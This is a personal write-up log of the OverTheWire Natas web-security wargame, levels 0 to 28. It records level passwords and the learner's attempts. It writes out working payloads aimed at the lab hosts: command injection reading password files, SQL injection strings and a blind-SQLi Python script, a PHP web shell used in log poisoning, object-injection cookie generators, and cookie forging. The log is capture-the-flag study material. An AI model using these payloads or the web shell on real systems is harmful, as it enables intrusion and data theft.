so lets do natas again. I reached natas 30 but I did use AI for some levels. Like after trying ofc.

###### natas0
natas0
natas0
The pass was hidden as a commend in the HTML code.

###### natas1
natas1
scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7
The pass was in the same place, but rightclick was blocked. F12.

###### natas2
natas2
vsDOxoXyq3wckCP1ZmTZ71ngIA606odB
Pass was hidden in the /files/ subdirectory. there as an image called pixel.png and the directory was open. pass was inside users.txt

###### natas3
natas3
K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
I went to the robots.txt file since it was a clue from the "not even Google will find it"
subdirectory /secrets/ or whatever and the pass was there

###### natas4
natas4
JDrPnuZAKyl6MkiqQGFIddrqpvgOASth

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
I am thinking about changing/adding the referrer with burp suite.
yep: Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M

###### natas5
natas5
e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
There is a cookie called loggedin with a value of 0. Changed it to 1 and got:
Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT

###### natas6
natas6
7mhjtShJAcld2NYbKHEadnhEwRn2P8VT

We get a screen with an input and submit form. No cookies.
Maybe a command injection? maybe lets just call nataspass?
i tried " echo file_get_contents(/etc/natas_webpass/natas7");
the input is a text in a function. we need to break out of that function. Thats a command injection?
I am a dumbass, there is source code for this level.
It seems like we need to manipulate and use secret.inc
or... just open it?
[natas6.natas.labs.overthewire.org/includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc)
FOEIUWGHFEEUHOFUOIU
Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
So far no code. lol.

###### natas7
natas7
B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0

[natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
solved in 10 seconds.

###### natas8
natas8
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc

we have this php code:
  
`$encodedSecret = "3d3d516343746d4d6d6c315669563362";`  
  
`function encodeSecret($secret) {`  
    `return bin2hex(strrev(base64_encode($secret)));`  
`}`  
  
`if(array_key_exists("submit", $_POST)) {`  
    `if(encodeSecret($_POST['secret']) == $encodedSecret) {`  
    `print "Access granted. The password for natas9 is <censored>";`  
    `} else {`  
    `print "Wrong secret";`  
    `}`  
`}`  

decode and submit the secret.

decode base64 - strrev - hex2bin

lets run it in php online even just for good measure.

`<?php`

`function decodeSecret() {`
    `$encodedSecret = "3d3d516343746d4d6d6c315669563362";`

    `$decodedSecret = base64_decode(strrev(hex2bin($encodedSecret)));`

    `return $decodedSecret;`
`}`

`echo decodeSecret();`
`?>`

output: oubWYf2kBq
Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

###### natas9
natas9
UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

`<?`  
`$key = "";`  
  
`if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];`  
`}`  
  
`if($key != "") {    passthru("grep -i $key dictionary.txt");`  
`}`  
`?>`

Code Injection!

&cat /etc/natas_webpass/natas10
With burp suite for fuzzing.

EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

###### natas10
natas10
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

it seems like they are filtering some characters now.
no  \`

http://natas10.natas.labs.overthewire.org/?needle=%0Acat%20/etc/natas_webpass/natas11&submit=Search
after some fuzzing with burpsuite.
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd

###### natas11
natas11
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
(27.6.26 12:56)
We have an interface where I can change the background color.
it saves the data in a cookie named "data". It is encryped with XOR encryption.
From reading the code at first glance (and I am not a great programmer by any means), I think the data has both fields for background color and show password = false/no/whatever.
I think I will try to decrypt it using what I know, I have the encoded text and the data that should be in it, and then to make a cookie with show password = yes.
This is my current approach.
the cookie is built like that:

save data:
json encode - xor encrypt - base64 encode
according to the code, this is the default data in json.
{"showpassword":"no","bgcolor":"#ffffff"}
if we encrypt with the cookie as the key we can calculate the key.
I will do it in php. Why tf am i doing it in php online? meh

I ran this code:
`<?php`
`$key = base64_decode("EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY=");`
`$text = '{"showpassword":"no","bgcolor":"#ffffff"}';`
`$outText = '';`

    `// Iterate through each character`
    `for($i=0;$i<strlen($text);$i++) {`
    `$outText .= $text[$i] ^ $key[$i % strlen($key)];`
    `}`

    `print $outText;`
`?>`

output: kBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwk
So the key is kBSw
Now we can create our own cookie!

Code:
`<?php`
`$key = "kBSw";`
`$text = '{"showpassword":"yes","bgcolor":"#ffffff"}';`
`$outText = '';`

    `// Iterate through each character`
    `for($i=0;$i<strlen($text);$i++) {`
    `$outText .= $text[$i] ^ $key[$i % strlen($key)];`
    `}`

    `print base64_encode($outText); // Print as base64 encode ready for cookie`
`?>`

output: EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk/
We enter the cookie and we get this!!!
Cookies are protected with XOR encryption  
  
The password for natas12 is EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng

So proud of myself for real! Last time I did this level I couldn't even recreate this with ChatGPT. The trick is to try harder, use the functions you have with php and try to really understand what you need to do.

###### natas12
natas12
EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng

We need to upload a file and then we can view it. RCE?
I created a file with this code: 
`<?php`
`$filename = '/etc/natas_webpass/natas13';`
`$content = file_get_contents($filename);`
`if ($content !== false) {`
    `echo $content;`
`} else {`
    `echo "Error: Could not read file.";`
`}`
`?>`

And captured the http request and edited the file extension from jpg to .php.

output: g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

###### natas13
natas13
g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

For security reasons, we now only accept image files!
Lets change the file header to a photo magic header. I remember this trick from last run, basically the code in this challange checks the header of the file for data to indicate that it's a photo.

output: GIF89a; A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8

###### natas14
natas14
A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
(28.6.26 14:09)
I'll try to do at least 2 levels today before imma head home.

It was easy. like its 14:10 now. It was a login extremely valuable to SQL injection.
Hit him with that `" or ""="`
no sanitizations, no escaping, nothing.
Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g

###### natas15
natas15
GB6USCJYJjwLyYhZUNkE1NwDueiTow6g

I remember this level. Basically I can ask if natas15 exists and his password starts with A. It will go through a-z A-Z 0-9. Lets say it starts with z
After i get a hit, I will rerun this script with z in the beginning. Passwords are 32 chars long.
I gave chatgpt the script i wrote and it gave me a much faster version:
Python script:

`import requests`

`from concurrent.futures import ThreadPoolExecutor, as_completed`

  

`URL = "http://natas15.natas.labs.overthewire.org/index.php"`

`AUTH = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")`

  

`session = requests.Session()`

`session.auth = AUTH`

  
  

`def get_char(position):`

    `low = 32`

    `high = 126`

  

    `while low <= high:`

        `mid = (low + high) // 2`

  

        `payload = f'natas16" AND ASCII(SUBSTRING(password,{position},1)) > {mid} -- '`

  

        `response = session.post(`

            `URL,`

            `data={"username": payload},`

            `timeout=10`

        `)`

  

        `if "This user exists" in response.text:`

            `low = mid + 1`

        `else:`

            `high = mid - 1`

  

    `return position, chr(low)`

  
  

`password = ["?"] * 32`

  

`with ThreadPoolExecutor(max_workers=16) as executor:`

    `futures = [executor.submit(get_char, i) for i in range(1, 33)]`

  

    `for future in as_completed(futures):`

        `pos, ch = future.result()`

        `password[pos - 1] = ch`

        `print(f"[{pos:02}] -> {ch} | Current: {''.join(password)}")`

  

`print("\nPassword:", "".join(password))`

###### natas16
Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
Basically the same script, but we are passing a grep command inside the $key.
$(grep ^{attempt} /etc/natas_webpass/natas17)
if valid then it will return no results. Script is saved in my natas folder.
KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx

###### natas17
natas17
KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
Its a check user code but it doesnt print anything. So i am thinking about sleep based oracle.
Of course, I remember it from the last time I did this lol. Call it pattern recognition.
Ill do it tomorrow. I will go home soon!
30.6.26 8:41
I tried many approaches, not enough. I ended up using the old script and SQL phrasing. My idea was correct, it was just a matter of syntex.
I don't call it cheating, but ChatGPT did the syntex not gonna lie.
Still, my idea was correct.
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op

###### natas18
natas18
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op

There is a login page. I need to get into an admin session to get the password for natas19
I want to try to bruteforce the cookie. Between 0 - 640.
Shouldn't take long.
Yep. Did it with burp suite. Cookie number 119.
You are an admin. The credentials for the next level are:
Username: natas19
Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT

###### natas19
natas19
qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT

This time it seems like the cookie is encoded.

I have a cookie of example:example
3133352d6578616d706c65

the cookie decoded is: number - username
According to isValodID function.
Isn't it great that they left the code for encryption and decryption?
This is my cookie decoded:
`$h = "3133352d6578616d706c65";`

`function myhex2bin($h) {`
  `if (!is_string($h)) return null;`
  `$r='';`
  `for ($a=0; $a<strlen($h); $a+=2) {`
    `$r .= chr(hexdec($h[$a].$h[$a+1]));`
  `}`
  `return $r;`
`}`

`echo myhex2bin($h);`
`?>`
all we need is to create a cookie with admin as the name!
69 - admin. encoded to hex: 36392d61646d696e
it doesnt work. maybe i need to use a valid id?
doesnt work either.
Lets bruteforce with the known encryption
0-640-admin.

[+] Found valid ID: 281
[+] Payload: 3238312d61646d696e

You are an admin. The credentials for the next level are:  

Username: natas20
Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao

###### natas20
natas20
slOKYGsjlJhaqKliGvrgWAzln0JyrWao

So basically the same thing.
The session is being saved via session_save_path() which in default is /tmp/

We run a brute-force check to http://natas20.natas.labs.overthewire.org/tmp/mysess_{i}-admin
with i being a-z, A-Z, 0-9

Well, I wasnt even close.

payload: name=admin%0aadmin+1
this is supposed to get the data to
name = admin
admin 1
as the session name.
basically newline injection and session something something.
meh.

Username: natas21
Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU

###### natas21
natas21
7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU

There are two pages. One is a regular one which will change once i enter an admin session, the other one I can just change the colors of the page. My guess is session injection or newline injection from the fields in the other page.
YES!
So what i did was capture the request on each pages.
I added admin=1 to the POST request. Then i copied that cookie to the main page to use the same session. And i got this:
You are an admin. The credentials for the next level are:
Username: natas22
Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF

###### natas22
natas22
964laB0r7TuDqJj5b3HFtwsQoc0GhjBF

We are met with an empty page. It will print the credentials once I am admin.
I will get admin once I invoke the revelio session.
I send a request of ?revelio=1
When I intercept the response it showed me the credentials!
Username: natas23
Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5

the login in this levels is that if I am not admin when invoking the revelio function, it should redirect me immediately. Because I was able to capture the response before the redirection, it trusted that only admin can invoke the function. Or something like that.

###### natas23
natas23
CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5

we need to input the password iloveyou but also make it 10 chars long.
using the regular browser with spaces doesn't work.
I'll search on stack exchange.
Oh! once I tried to treat passwd as an array I got this
**Warning**: strstr() expects parameter 1 to be string, array given in **/var/www/natas/natas23/index.php** on line **23**
Maybe this is the way to solve it?
Also, in the code `$_REQUEST["passwd"] > 10` this is comparing strings to numbers.

[natas23.natas.labs.overthewire.org/?passwd=11iloveyou](http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou)
The credentials for the next level are:  

Username: natas24 Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX

Here we both have 11 > 10 and iloveyou! Payload by me ofc.

###### natas24
natas24
shlL4BvOtawNCd81dwdKRHFzmTEjYYQX

`<?php    if(array_key_exists("passwd",$_REQUEST)){`  
        `if(!strcmp($_REQUEST["passwd"],"<censored>")){`  
            `echo "<br>The credentials for the next level are:<br>";`  
            `echo "<pre>Username: natas25 Password: <censored></pre>";`  
        `}`  
        `else{`  
            `echo "<br>Wrong!<br>";`  
        `}`  
    `}    // morla / 10111`  
`?>`

I will try something similar.
[natas24.natas.labs.overthewire.org/?passwd[]=11iloveyou](http://natas24.natas.labs.overthewire.org/?passwd[]=11iloveyou)
The credentials for the next level are:  

Username: natas25 Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo

Another example of type juggling.

###### natas25
natas25
UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo

This website blocks path traversal from the languege selection.
I do remember something with the user agent, but I am not going to do it now. I am going to it. Probably poison the log by changing the user agent to /etc/natas_webpass/natas26 or something.

/?lang=....//logs/natas25_srjojurrnasl91j7q63c9fo6dt.log

`<?php echo "PWNED"; ?>`
`<?php system($_GET['cmd']); ?>`

request:
GET /?lang=....//logs/natas25_srjojurrnasl91j7q63c9fo6dt.log&cmd=cat%20/etc/natas_webpass/natas26 HTTP/1.1
Host: natas25.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNTpVSkVGNU9BSEYxZVczbHFrcGRDRE03b3c0c3l6aDRvbw==
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=srjojurrnasl91j7q63c9fo6dt
Connection: keep-alive

3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT

bruh. tough level. I should keep in mind that RCE backdoor cmd thingie. Windows Defender marked this line as a virus lol

I use chat for syntax. I did understand the exploit, just I didnt remember the exact syntex to do it.

###### natas26
natas26
3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT

(1.7.26 10:00)
We have a program that prints line.
I remember or at least think that the exploit lies in the php object behavior. It takes input for messages to be written in the log. I can perhaps create an object, somehow and put code injection in.
I just don't know how...
I am reading through this: [PHP Object Injection | OWASP Foundation](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
And this: [What is Object Injection? Exploitations and Security Tips](https://www.vaadata.com/en/blog/what-is-object-injection-exploitations-and-security-best-practices/)
This is hard. I wont just give up though. I am going to solve it by myself.

Ok. After a few hours I came up with this:
a:2:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:3:"200";s:2:"y2";s:3:"200";}i:1;O:6:"Logger":3:{s:15:"%00Logger%00logFile";s:21:"/tmp/natas26_test.log";s:15:"%00Logger%00initMsg";s:21:"my custom start text";s:15:"%00Logger%00exitMsg";s:47:"readfile('../../../etc/natas_webpass/natas27');";}

with null bytes instead of %00:

a:2:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:3:"200";s:2:"y2";s:3:"200";}i:1;O:6:"Logger":3:{s:15:"�Logger�logFile";s:21:"/tmp/natas26_test.log";s:15:"�Logger�initMsg";s:21:"my custom start text";s:15:"�Logger�exitMsg";s:47:"readfile('../../../etc/natas_webpass/natas27');";}

I will try to inject to the cookie it and LFI the image to show the log maybe?

These didn't work. I ended up using this php script to generate a well-formed cookie. Mine were not working due to the null bytes. Don't use online tools...


`<?php`

`class Logger {`
    `private $logFile;`
    `private $initMsg;`
    `private $exitMsg;`

    `public function __construct() {`
        `$this->logFile = "/tmp/natas26_test.log";`
        `$this->initMsg = "my custom start text";`
        `$this->exitMsg = "readfile('../../../etc/natas_webpass/natas27');";`
    `}`
`}`

`$data = [`
    `[`
        `"x1" => "10",`
        `"y1" => "10",`
        `"x2" => "200",`
        `"y2" => "200"`
    `],`
    `new Logger()`
`];`

`$serialized = serialize($data);`
`$cookie = urlencode(base64_encode($serialized));`

`// echo $serialized . PHP_EOL;`
`echo $cookie . PHP_EOL;`
`?>`
YToyOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjM6IjIwMCI7czoyOiJ5MiI7czozOiIyMDAiO31pOjE7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMToiL3RtcC9uYXRhczI2X3Rlc3QubG9nIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjA6Im15IGN1c3RvbSBzdGFydCB0ZXh0IjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDc6InJlYWRmaWxlKCcuLi8uLi8uLi9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI2Jyk7Ijt9fQ%3D%3D

This time, no errors. But how to I see the log?

Well, I am going to look at a walkthrough. I am just a step away from understanding it.
I read the walkthrough, I was so close!
All I needed to do was create a file instead of the log file. Here is the updated php code.
All is needed to change is the user personal cookie and to replace this cookie with the drawing cookie.


`<?php`

`class Logger {`
    `private $logFile;`
    `private $initMsg;`
    `private $exitMsg;`

    `public function __construct() {`
        `$this->logFile = "/var/www/natas/natas26/img/natas26_90kbei8hk7gm0ebqst6sd3vh4d.php";`
        `$this->initMsg = "my custom start text";`
        `$this->exitMsg = "<?php readfile('/etc/natas_webpass/natas27'); ?>";`
    `}`
`}`

`$data = [`
    `[`
        `"x1" => "10",`
        `"y1" => "10",`
        `"x2" => "200",`
        `"y2" => "200"`
    `],`
    `new Logger()`
`];`

`$serialized = serialize($data);`
`$cookie = urlencode(base64_encode($serialized));`

`// echo $serialized . PHP_EOL;`
`echo $cookie . PHP_EOL;`
`?>`

http://natas26.natas.labs.overthewire.org/img/natas26_90kbei8hk7gm0ebqst6sd3vh4d.php

readfile('../../../etc/natas_webpass/natas27');readfile('../../../etc/natas_webpass/natas27');  
**Warning**: readfile(../../../etc/natas_webpass/natas27): failed to open stream: No such file or directory in **/var/www/natas/natas26/img/natas26_90kbei8hk7gm0ebqst6sd3vh4d.php** on line **1**  
  
**Warning**: readfile(../../../etc/natas_webpass/natas27): failed to open stream: No such file or directory in **/var/www/natas/natas26/img/natas26_90kbei8hk7gm0ebqst6sd3vh4d.php** on line **1**  
mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV

###### natas27
natas27
mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
(5.7.26 16:05)

I have been seating on this for like an hour. I understand that only the first 64 chars matter. But I can try to input something like natas28+++...++a and because of all the spaces it will only catch the natas28.

I try with:
username: natas28                                                                       a
password: password

It seems like I can create another account with the exact username but a different password.

[Web Security Study Notes](https://blog.lyc8503.net/en/post/web-security/#SQL-Truncation)
## SQL Truncation

Suppose the username field in the database is defined as `varchar(32)`.

Assume there’s already an admin user named `admin`.

Now, a new user tries to register with the username: `admin x`.

The “admin” plus 27 spaces fills exactly 32 characters. During username uniqueness checks, the server sees `admin x` as a new name and allows registration. However, when inserting into the database, the input gets **truncated**—the trailing “x” is dropped, and trailing spaces are stripped. The final stored username becomes `admin`, conflicting with the existing admin account. This can lead to authentication or authorization bugs.

The root cause: many SQL servers default to silently truncating overly long inputs (issuing a warning but allowing the operation to succeed).

Any field requiring uniqueness may be vulnerable to SQL truncation.

Defense: **Validate input length on the backend**, or configure the SQL server to **strict mode**, turning truncation warnings into errors.

19:54
I am also trying 
natas28                                                         x
which is exactly 65 chars long. I am able to create it again and again but not log into it.
I trying using the browser, using burp suite. I remember watching a walkthrough back then, but I honestly don't remember hoe to solve it besides the theory in general.
OK. Now it worked.
I created an account with the creds above with password as "password".
Then I tried to create the same account to log in. Once with the x, once without. On the repeater. Now it worked...
Welcome natas28 !  
Here is your data:  
Array ( [username] => natas28 [password] => Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3 )
I did this multiple times. If it works, it works I GUESS...
Also worked in the browser.
IDK!
###### natas28
natas28
Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3
7.7.26
So we are met with a search engine for jokes I assume? We can search for values in the searchbar. For example, I can search for "programming" and it will give me the only joke with that word in it.
Lets try some SQL injections.
Nothing really seemed to work.
I remember that the url is changing based on the search content.
I will use a python script to try and understand when and why it changes...

A - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
AA - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKYsNYgsg1hFJebd%2BJNix06SHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D
AAA - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ8EmoxKU1njKubmw7%2BRDt1mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
AAAA - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK02918sQNUadassvlSAHDHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
AAAAA - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJLk0xdEarIh%2BMvTkV61TlvrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
AAAAAA - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ%2BDZedSJQqwrZX9tfUGM7WQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o%3D
" or 1=1 - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKjUmCHmyVLENLHC2NhDYGVoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
admin'-- - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJMGfRt3GNyJrUOdnBE6rq8oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
hello my name is vlad! - http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKuz6MtnpN1Dw0ZHR0VWCB%2FbAJBNQ%2BR8aVgNGZwPAUuEkHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK

Code is in the python file.
Looks like if we do sql injection the end of the url is the same.
The start is always the same.
I remember you could inject some commands into the url.
Lets try to decode what changed in the dirty, SQL injection url.
8.7.26 9:25
We got a clue. This is AES cypher, which is 16 bytes blocks.
With chat explaining a bit (this is how we solve today!)
this is probbaly something like:
fixed_prefix || user_input || fixed_suffix || padding

Here are a few search queries in hex, to see its bytes. Since its in 16 bytes blocks, I will try to decypher and understand the mechanics.

If - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2133dc8b2f857cc139674e5f577a0fab848799a07b1d29b5982015c9355c2e00eaded9bdbaca6a73b71b35a010d2c4c57
Be - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf21ba087a9ae0c9f42b2b663f9c4be054548799a07b1d29b5982015c9355c2e00eaded9bdbaca6a73b71b35a010d2c4c57
Bec - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf255d2bd212ce61f7fc26e5a0d258f5e709a2e2b5db6f31f19a14f75678eadaa904249b93e4dea0909479995b9c44b351a
Abe - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf26b2d42368e0dbcb4cac25fbd0e61b84b9a2e2b5db6f31f19a14f75678eadaa904249b93e4dea0909479995b9c44b351a
OBOL - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2dc64e9b3eebf5f357b632bba4a6721ce29287f3cc5479e12e66f31c863b1804756d5732dc8c770f64397158bc17a6e66
Dudu - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2ee81daea4cf3a32f30b9f9ad812f63a329287f3cc5479e12e66f31c863b1804756d5732dc8c770f64397158bc17a6e66
" or 1=1 -- - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2f0d12560b7879c12abc3c9866b3fdfae2287d631f55813124b774a2219de3f4a75fd5044fd063d26f6bb7f734b41c899
Qqqqqqqqqqq - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2070bdd4684c4270354b8f08f7cb5480e68b151738d0187c720487ee2912fdb22ca8cf4e610913abae39a067619204a5a
Qqqqqqqqqqk - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2070bdd4684c4270354b8f08f7cb5480edfc9113cd04d1d65b06c7a624629a828ca8cf4e610913abae39a067619204a5a
" or 1=2 -- - 1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf23a3af555d3f9f1e46f405fda038b29cc2287d631f55813124b774a2219de3f4a75fd5044fd063d26f6bb7f734b41c899

Lets compare these


![[Pasted image 20260708165333.png]]

Ok. I ran all these tests and I think I understand whats going on.
The start is the same. Then we have a part that changes according to input, and in the end I assume there is a part that takes length and if there is an SQLi attempt.
How about I will switch the dirty part in the SQLi to a clean part, with the same length?
lets switch the bytes between the SQLi and the Qqqq.. part.

1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2 f0d12560b7879c12abc3c9866b3fdfae ca8cf4e610913abae39a067619204a5a

2287d631f55813124b774a2219de3f4a75fd5044fd063d26f6bb7f734b41c899

4 parts of 16 bytes. First two are the same. Then the dirty part, then the clean part.

Base64 - G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLw0SVgt4ecEqvDyYZrP9+uyoz05hCROrrjmgZ2GSBKWg==

URL encode - G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLw0SVgt4ecEqvDyYZrP9%2Buyoz05hCROrrjmgZ2GSBKWg%3D%3D

We got nothing...

Fuck.
I am too hungry for this. I am taking a break.

19:10
Both of these are the same length of search.
I am going to change every block between the normal search and the SQLi until i get a hit.

" or 1=1 --:
1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2 f0d12560b7879c12abc3c9866b3fdfae 2287d631f55813124b774a2219de3f4a 75fd5044fd063d26f6bb7f734b41c899

Qqqqqqqqqqq:
1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2 070bdd4684c4270354b8f08f7cb5480e 68b151738d0187c720487ee2912fdb22 ca8cf4e610913abae39a067619204a5a

Payload1: (3 blocks end are dirty)

1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2
(this part is always the same)
f0d12560b7879c12abc3c9866b3fdfae 2287d631f55813124b774a2219de3f4a 75fd5044fd063d26f6bb7f734b41c899

Nope

Payload2: (2 blocks end are dirty)

1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2
(this part is always the same, last is normal)
f0d12560b7879c12abc3c9866b3fdfae 2287d631f55813124b774a2219de3f4a ca8cf4e610913abae39a067619204a5a

Nope

Payload2: (2 blocks end are dirty)

1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2
(this part is always the same, last is normal)
f0d12560b7879c12abc3c9866b3fdfae 2287d631f55813124b774a2219de3f4a ca8cf4e610913abae39a067619204a5a

20:21
I asked chat to generate all combos possible, there are 8.
Will test.

I tried all. It did not work.

I read a walkthrough. It was close, but not enough.
MEH.